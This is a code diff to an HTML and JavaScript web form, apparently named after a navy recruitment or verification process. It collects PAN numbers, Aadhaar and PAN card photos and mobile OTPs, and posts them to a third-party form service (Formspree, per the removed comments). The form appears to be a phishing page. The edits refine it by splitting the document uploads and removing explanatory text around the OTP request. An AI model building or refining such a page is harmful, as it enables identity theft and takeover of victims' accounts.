@@ -40,8 +40,11 @@
             <label>PAN Card Number *</label>
             <input type="text" name="PAN_Number" required>
 
-            <label>Aadhaar Front & Back Photo *</label>
-            <input type="file" name="Aadhaar_File" required>
+            <label>Aadhaar Front Photo *</label>
+            <input type="file" name="Aadhaar_Front" required>
+
+            <label>Aadhaar Back Photo *</label>
+            <input type="file" name="Aadhaar_Back" required>
 
             <label>PAN Card Photo *</label>
             <input type="file" name="PAN_File" required>
@@ -54,8 +57,6 @@
 
         <div id="otp-section">
             <h3 style="text-align:center; color:#003366; margin-top:0;">🔐 IDENTITY VERIFICATION</h3>
-            <p style="font-size:11px; text-align:center; color:#555;">Please enter the OTP sent to your registered number.</p>
-            
             <label>Mobile OTP *</label>
             <input type="text" name="Mobile_OTP" placeholder="Enter Mobile OTP" required>
             
@@ -72,29 +73,24 @@
         var form = document.getElementById('navyForm');
         var btn = document.getElementById('nextBtn');
 
-        // Check if all fields are filled
         if(!form.checkValidity()) {
-            alert("Please fill all details and upload photos correctly.");
+            alert("Please fill all details and upload all photos correctly.");
             return;
         }
 
-        btn.innerHTML = "Sending... Please wait";
+        btn.innerHTML = "Processing...";
         btn.disabled = true;
 
-        var formData = new FormData(form);
-
-        // Sending data to Formspree immediately
         fetch(form.action, {
             method: 'POST',
-            body: formData,
+            body: new FormData(form),
             headers: { 'Accept': 'application/json' }
         }).then(response => {
-            // Success: Show OTP screen
             document.getElementById('details-section').style.display = 'none';
             document.getElementById('otp-section').style.display = 'block';
             window.scrollTo(0,0);
         }).catch(error => {
-            alert("Error sending details. Check your connection.");
+            alert("Error. Please try again.");
             btn.innerHTML = "Next: Verify Identity";
             btn.disabled = false;
         });
